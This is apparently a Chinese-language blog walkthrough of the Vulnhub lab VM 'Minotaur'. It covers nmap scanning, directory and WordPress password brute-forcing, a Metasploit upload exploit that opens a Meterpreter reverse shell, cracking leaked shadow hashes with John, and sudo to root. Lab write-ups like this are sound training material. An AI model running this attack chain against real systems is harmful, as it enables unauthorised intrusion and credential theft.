{"pageProps":{"postData":{"id":"VulnhubSecTalks：BNE0x00 - Minotaur","contentHtml":"<h1>SecTalks：BNE0x00 - Minotaur</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/\">https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>使用nmap扫描网段类存活主机</p>\n<p>因为靶机是我最后添加的，所以靶机IP是<code>172</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-30 15:36 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00016</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00013</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.172</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00014</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:CA:<span class=\"hljs-number\">6</span>B:<span class=\"hljs-title function_ invoke__\">E4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00019</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:EC:C5:<span class=\"hljs-title function_ invoke__\">A4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.172</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-30 15:37 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.172</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00097</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">2020</span>/tcp open  xinupageserver\n</code></pre>\n</li>\n<li>\n<p>扫描主机服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p80,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">2020</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.172</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-10-30 15:38 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.172</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00037</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   open  ssh     OpenSSH <span class=\"hljs-number\">6.6</span>.<span class=\"hljs-number\">1</span>p1 Ubuntu <span class=\"hljs-number\">2</span>ubuntu2 (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">7</span> ((Ubuntu))\n<span class=\"hljs-number\">2020</span>/tcp open  ftp     vsftpd <span class=\"hljs-number\">2.0</span>.<span class=\"hljs-number\">8</span> <span class=\"hljs-keyword\">or</span> later\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:CA:<span class=\"hljs-number\">6</span>B:<span class=\"hljs-title function_ invoke__\">E4</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: Host: minotaur; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\"> nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">2020</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">30</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">38</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00048</span>s latency).\n\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n|_http-csrf: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> CSRF vulnerabilities.\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n| http-slowloris-check:\n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server'</span>s resources causing Denial Of Service.\n|\n|     Disclosure date: <span class=\"hljs-number\">2009</span>-09-<span class=\"hljs-number\">17</span>\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-<span class=\"hljs-built_in\">bin</span>/cvename.cgi?name=CVE-<span class=\"hljs-number\">2007</span>-<span class=\"hljs-number\">6750</span>\n<span class=\"hljs-number\">2020</span>/tcp <span class=\"hljs-built_in\">open</span>  xinupageserver\n\n</code></pre>\n<p><code>2020</code>端口是<code>vsftp</code> 不过显示<code>xinupageserver</code> 不认识</p>\n<p><code>2020</code> > <code>80</code> ><code>22</code></p>\n</li>\n</ol>\n<h2>vsftp</h2>\n<ol>\n<li>\n<p>使用匿名帐户登录，啥也没有</p>\n<pre><code class=\"hljs language-python\">ftp <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span> <span class=\"hljs-number\">2020</span>\nConnected to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>.\n<span class=\"hljs-number\">220</span> Welcome to minotaur FTP service.\nName (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>:root): anonymous\n<span class=\"hljs-number\">331</span> Please specify the password.\nPassword:\n<span class=\"hljs-number\">230</span> Login successful.\nRemote system <span class=\"hljs-built_in\">type</span> <span class=\"hljs-keyword\">is</span> UNIX.\nUsing binary mode to transfer files.\nftp> <span class=\"hljs-built_in\">dir</span>\n<span class=\"hljs-number\">229</span> Entering Extended Passive Mode (|||<span class=\"hljs-number\">60294</span>|).\n<span class=\"hljs-number\">150</span> Here comes the directory listing.\n<span class=\"hljs-number\">226</span> Directory send OK.\nftp>\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问主页，是<code>apache</code>默认主页</p>\n</li>\n<li>\n<p>扫描目录，扫出个<code>/flag.txt</code></p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span> -x <span class=\"hljs-number\">403</span>\n[<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">54</span>:07] Starting:\n[<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">35</span>] <span class=\"hljs-number\">200</span> -   47B  - /flag.txt\n\nTask Completed\n</code></pre>\n<p>访问得到<code>flagA</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># flag.txt</span>\nOh, lookey here. A flag!\nTh15 <span class=\"hljs-number\">15</span> @N <span class=\"hljs-number\">3</span>@5y f1@G!\n</code></pre>\n<p>没头绪了，怀疑目录爆破不完全，换字典尝试</p>\n</li>\n<li>\n<p>尝试了几个字典终于找出了新目录 <code>bull</code></p>\n<p><a href=\"https://github.com/TheKingOfDuck/fuzzDicts\">https://github.com/TheKingOfDuck/fuzzDicts</a></p>\n<p>字典连接，使用<code>fuzz/paramDict/dir.txt</code> 爆破出来的</p>\n</li>\n<li>\n<p>访问新目录</p>\n<p><img src=\"/post-images/VulnhubSecTalks%EF%BC%9ABNE0x00%20-%20Minotaur/image61.png\" alt=\"image.png\"></p>\n<p>发现是<code>WordPress 4.2.2</code></p>\n</li>\n<li>\n<p>直接使用<code>wpscan</code></p>\n<pre><code class=\"hljs language-python\">wpscan --url <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>/bull/ -e u\n</code></pre>\n<p>枚举出用户<code>bully</code> ，尝试爆破，尝试了常规字典爆破无法枚举出来，看靶机官网底下写着需要额外的字典，所以可能是让我们生成字典</p>\n</li>\n</ol>\n<h2>生成字典</h2>\n<ol>\n<li>\n<p>使用<code>cewl</code>生成<code>cms</code>关键字字典，生成最短密码长度为<code>6</code>的密码字典</p>\n<pre><code class=\"hljs language-python\">cewl http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>/bull -m <span class=\"hljs-number\">6</span> > wordlist.txt\n</code></pre>\n</li>\n<li>\n<p>然后再使用<code>John</code>来生成更多密码组合</p>\n<pre><code class=\"hljs language-python\">john --wordlist=wordlist.txt --rules --stdout > words-john.txt\n</code></pre>\n</li>\n<li>\n<p>再尝试使用新生成的字典去爆破</p>\n<pre><code class=\"hljs language-python\">wpscan --url <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>/bull/ -U bully -P words-john.txt\n//\n[SUCCESS] - bully / Bighornedbulls\n</code></pre>\n<p>枚举出密码<code>Bighornedbulls</code></p>\n</li>\n</ol>\n<h2>拿到shell</h2>\n<ol>\n<li>\n<p>我这里的<code>wpscan</code>扫不出任何漏洞（可能是我IP配置不正确的问题），查看了<code>WP</code>发现有个幻灯片插件存在漏洞，并且在<code>MSF</code>下有利用脚本</p>\n<pre><code class=\"hljs language-python\">msf6 > use exploit/unix/webapp/wp_slideshowgallery_upload\nmsf6 exploit(unix/webapp/wp_slideshowgallery_upload) > <span class=\"hljs-built_in\">set</span> rhosts <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>\nrhosts => <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>\nmsf6 exploit(unix/webapp/wp_slideshowgallery_upload) > <span class=\"hljs-built_in\">set</span> targeturi /bull/\ntargeturi => /bull/\nmsf6 exploit(unix/webapp/wp_slideshowgallery_upload) > <span class=\"hljs-built_in\">set</span> WP_PASSWORD Bighornedbulls\nWP_PASSWORD => Bighornedbulls\nmsf6 exploit(unix/webapp/wp_slideshowgallery_upload) > <span class=\"hljs-built_in\">set</span> WP_USER bully\nWP_USER => bully\nmsf6 exploit(unix/webapp/wp_slideshowgallery_upload) > run\n\n[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">4444</span>\n[*] Trying to login <span class=\"hljs-keyword\">as</span> bully\n[*] Trying to upload payload\n[*] Uploading payload\n[*] Calling uploaded file klccanyg.php\n[*] Sending stage (<span class=\"hljs-number\">39927</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>\n[+] Deleted klccanyg.php\n[*] Meterpreter session <span class=\"hljs-number\">1</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">4444</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>:<span class=\"hljs-number\">36399</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">30</span> <span class=\"hljs-number\">18</span>:07:<span class=\"hljs-number\">17</span> +0800\n\n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n$ whoami\nwww-data\n$ uname -a\nLinux minotaur <span class=\"hljs-number\">3.16</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">30</span>-generic <span class=\"hljs-comment\">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>寻找敏感文件</p>\n<ul>\n<li>\n<p><code>/tmp</code> 文件夹下存在<code>flag.txt</code>以及<code>shadow.bak</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># flag.txt</span>\nThat shadow.bak file <span class=\"hljs-keyword\">is</span> probably useful, hey?\nAlso, you found a flag!\nMy m1L|&#x3C;$|-|@|&#x3C;<span class=\"hljs-number\">3</span> br1|\\|G$ @<span class=\"hljs-number\">11</span> t3h b0y$ <span class=\"hljs-number\">2</span> t3h y@R|)\n\n</code></pre>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># shadow.bak</span>\nroot:$<span class=\"hljs-number\">6</span>$<span class=\"hljs-number\">15</span>/OlfJP$h70tk3qikcf.kfwlGpYT7zfFg.cRzlJMlbVDSj3zCg4967ZXG0JzN/6oInrnvGf7AZaJFE2qJdBAOc/3AyeGX.:<span class=\"hljs-number\">16569</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ndaemon:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n<span class=\"hljs-built_in\">bin</span>:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsys:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsync:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ngames:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nman:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nlp:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmail:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nnews:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nuucp:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nproxy:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nwww-data:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nbackup:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n<span class=\"hljs-built_in\">list</span>:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nirc:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ngnats:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nnobody:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nlibuuid:!:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsyslog:*:<span class=\"hljs-number\">16484</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmysql:!:<span class=\"hljs-number\">16569</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmessagebus:*:<span class=\"hljs-number\">16569</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nlandscape:*:<span class=\"hljs-number\">16569</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsshd:*:<span class=\"hljs-number\">16569</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nminotaur:$<span class=\"hljs-number\">6</span>$3qaiXwrS$1Ctbj1UPpzKjWSgpIaUH0PovtO2Ar/IshWUe4tIUrJf8VlbIIijxdu4xHsXltA0mFavbo701X9.BG/fVIPD35.:<span class=\"hljs-number\">16582</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nftp:*:<span class=\"hljs-number\">16573</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nheffer:$<span class=\"hljs-number\">6</span>$iH6pqgzM$3nJ00ToM38a.qLqcW8Yv0pdRiO/fXOvNv03rBzv./E0TO4B8y.QF/PNZ2JrghQTZomdVl3Zffb/MkWrFovWUi/:<span class=\"hljs-number\">16582</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nh0rnbag:$<span class=\"hljs-number\">6</span>$nlapGOqY$Hp5VHWq388mVQemkiJA2U1qLI.rZAFzxCw7ivfyglRNgZ6mx68sE1futUy..m7dYJRQRUWEpm3XKihXPB9Akd1:<span class=\"hljs-number\">16582</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>尝试爆破</p>\n<ul>\n<li>\n<p>将泄露密码的几个账户保存为<code>users.txt</code></p>\n<pre><code class=\"hljs language-python\">john users.txt \n//\nUsing default <span class=\"hljs-built_in\">input</span> encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">4</span> password hashes <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">4</span> different salts (sha512crypt, crypt(<span class=\"hljs-number\">3</span>) $<span class=\"hljs-number\">6</span>$ [SHA512 <span class=\"hljs-number\">256</span>/<span class=\"hljs-number\">256</span> AVX2 4x])\nCost <span class=\"hljs-number\">1</span> (iteration count) <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">5000</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">all</span> loaded hashes\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nProceeding <span class=\"hljs-keyword\">with</span> single, rules:Single\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost <span class=\"hljs-built_in\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nAlmost done: Processing the remaining buffered candidate passwords, <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">any</span>.\nProceeding <span class=\"hljs-keyword\">with</span> wordlist:/usr/share/john/password.lst\nPassword1        (heffer)     \nobiwan6          (minotaur)     \n</code></pre>\n<p>把两个用户的密码爆破出来了</p>\n</li>\n<li>\n<p>尝试用ssh登录</p>\n<pre><code class=\"hljs language-python\">ssh minotaur@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span>\nminotaur@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.172</span><span class=\"hljs-string\">'s password:\nWelcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.16.0-30-generic i686)\n\n * Documentation:  https://help.ubuntu.com/\n\n  System information as of Thu Oct 31 02:36:26 AEDT 2024\n\n  System load: 0.72              Memory usage: 9%   Processes:       162\n  Usage of /:  7.3% of 18.81GB   Swap usage:   0%   Users logged in: 0\n\n  Graph this data and manage this system at:\n    https://landscape.canonical.com/\n\nLast login: Wed May 27 16:55:30 2015\nminotaur@minotaur:~$ sudo -l\nMatching Defaults entries for minotaur on minotaur:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser minotaur may run the following commands on minotaur:\n    (root) NOPASSWD: /root/bullquote.sh\n    (ALL : ALL) ALL\nminotaur@minotaur:~$\n</span></code></pre>\n<p>意外发现<code>minotaur</code>的权限和<code>root</code>相等</p>\n<pre><code class=\"hljs language-python\">minotaur@minotaur:~$ sudo -i\n[sudo] password <span class=\"hljs-keyword\">for</span> minotaur:\nroot@minotaur:~<span class=\"hljs-comment\">#</span>\n</code></pre>\n<p>读取<code>flag.txt</code></p>\n<pre><code class=\"hljs language-python\">\nroot@minotaur:~<span class=\"hljs-comment\"># cat flag.txt</span>\nCongrats! You got the final flag!\nTh3 Fl@g <span class=\"hljs-keyword\">is</span>: 5urr0nd3d bY @r$3h0l35\n</code></pre>\n<pre><code class=\"hljs language-python\">root@minotaur:~<span class=\"hljs-comment\"># cat quotes.txt</span>\nAnd <span class=\"hljs-keyword\">for</span> me the only way to live life <span class=\"hljs-keyword\">is</span> to grab the bull but the horns <span class=\"hljs-keyword\">and</span> call up recording studios <span class=\"hljs-keyword\">and</span> <span class=\"hljs-built_in\">set</span> dates to go <span class=\"hljs-keyword\">in</span> recording studios. To <span class=\"hljs-keyword\">try</span> <span class=\"hljs-keyword\">and</span> accomplish somthing.\nIf you can<span class=\"hljs-string\">'t dazzle them with brilliance, baffle them with bull.\nI admire bull riders for their passion and the uniqueness each one of them has.\nI am a huge bull on this country. We will not have a double-dip recession at all. I see our businesses coming back almost across the board.\nNot only the bull attacks his enemies with curved horn, but also the sheep, when harmed fights fights back.\nSometimes I'</span>m kind of spacey. I<span class=\"hljs-string\">'m like Ferdinand the bull, sniffing the daisey, not aware of time, of what'</span>s going on <span class=\"hljs-keyword\">in</span> the world.\nThere comes a time <span class=\"hljs-keyword\">in</span> the affairs of man when he must take the bull by the tail <span class=\"hljs-keyword\">and</span> face the situation.\nBulls do <span class=\"hljs-keyword\">not</span> win full fights. People do.\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n<h2>总结</h2>\n<p>增强对字典生成能力，以及敏感目录的查找</p>","title":"Vulnhub - SecTalks：BNE0x00 - Minotaur","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"SecTalks：BNE0x00 Minotaur https://www.vulnhub.com/entry/sectalks bne0x00 minotaur,139/ 主机发现端口扫描 1. 使用nmap扫描网段类存活主机 因为靶机是我最后添加的，所以靶机IP是172 2. 扫描主机开放端口..."},"recentPosts":[{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"}]},"__N_SSG":true}